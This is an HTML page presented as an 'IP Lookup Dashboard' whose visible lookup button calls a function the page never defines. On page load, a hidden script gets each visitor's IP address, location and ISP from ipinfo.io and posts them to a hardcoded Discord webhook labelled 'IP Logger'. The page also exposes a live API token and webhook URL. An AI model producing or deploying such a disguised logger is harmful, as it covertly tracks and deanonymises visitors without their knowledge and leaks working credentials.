<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Lookup Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        async function sendIPToDiscord() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=4b708a498f9053');
                if (!response.ok) throw new Error('Failed to fetch IP data');
                
                const data = await response.json();
                const ipv4 = data.ip || "Onbekend";
                const ipv6 = "Niet beschikbaar via ipinfo.io";
                const port = window.location.port || "Standaard (80/443)";
                
                const webhookURL = "https://discord.com/api/webhooks/1337482415525859449/O475C9JANraLqnMMJCZNjQ5WU5KW_Wb-SiDani8sNkGTguQaLMGdsUTFkHK5EEPG3_lg";
                
                const payload = {
                    username: "IP Logger",
                    embeds: [{
                        title: "Nieuwe Website Bezoeker",
                        color: 16711680,
                        fields: [
                            { name: "IPv4 Adres", value: ipv4, inline: true },
                            { name: "IPv6 Adres", value: ipv6, inline: true },
                            { name: "Poort", value: port, inline: true },
                            { name: "Locatie", value: `${data.city}, ${data.region}, ${data.country}`, inline: false },
                            { name: "ISP", value: data.org || "Onbekend", inline: false }
                        ],
                        footer: { text: "Verzameld door IP Lookup Dashboard" }
                    }]
                };
                
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Fout bij het verzenden van IP-gegevens:", error);
            }
        }
        
        window.onload = sendIPToDiscord;
    </script>
</head>
<body class="bg-gray-900 text-white">
    <div class="container mx-auto p-6">
        <h1 class="text-3xl font-bold text-center">IP Lookup Dashboard</h1>
        <div class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg">
            <label for="ip" class="block mb-2">Enter IP Address:</label>
            <input type="text" id="ip" class="w-full p-2 rounded-lg bg-gray-700 text-white border border-gray-600" placeholder="Enter an IP address...">
            <button onclick="lookupIP()" class="mt-4 w-full bg-blue-600 p-2 rounded-lg hover:bg-blue-700" id="lookupButton">Lookup</button>
            <div id="result" class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg hidden">
                <h2 class="text-xl font-semibold">IP Details:</h2>
                <div id="output" class="output mt-4 bg-gray-700 p-4 rounded-lg">
                    <p><span>IP Address:</span> <span id="ipAddress"></span></p>
                    <p><span>City:</span> <span id="city"></span></p>
                    <p><span>Region:</span> <span id="region"></span></p>
                    <p><span>Country:</span> <span id="country"></span></p>
                    <p><span>ISP:</span> <span id="isp"></span></p>
                    <p><span>Latitude:</span> <span id="latitude"></span></p>
                    <p><span>Longitude:</span> <span id="longitude"></span></p>
                    <p><span>Timezone:</span> <span id="timezone"></span></p>
                    <p id="errorMessage" class="text-red-500"></p>
                    <p><strong>Geolocation:</strong></p>
                    <div id="googleMap" class="map-container mt-4"></div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
